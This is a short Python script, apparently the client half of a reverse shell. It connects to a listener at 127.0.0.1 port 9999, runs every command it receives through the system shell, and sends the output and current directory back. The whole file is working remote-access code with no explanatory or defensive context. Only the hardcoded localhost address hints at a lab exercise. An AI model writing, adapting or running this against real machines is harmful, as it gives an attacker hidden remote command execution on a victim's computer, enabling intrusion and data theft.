from socket import *
import os
import subprocess


host = '127.0.0.1'
port = 9999
s = socket()
s.connect((host, port))

while True:
	data =  s.recv(1024)
	if data[:2].decode('utf-8')=='cd':
		os.chdir(data[3:].decode('utf-8'))

	cmd = subprocess.Popen(data.decode('utf-8'),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
	output_bytes = cmd.stdout.read() + cmd.stderr.read()
	output_str = str(output_bytes, 'utf-8')
	s.send(str.encode(output_str + str(os.getcwd()) + ">"))
	print(output_str)
s.close()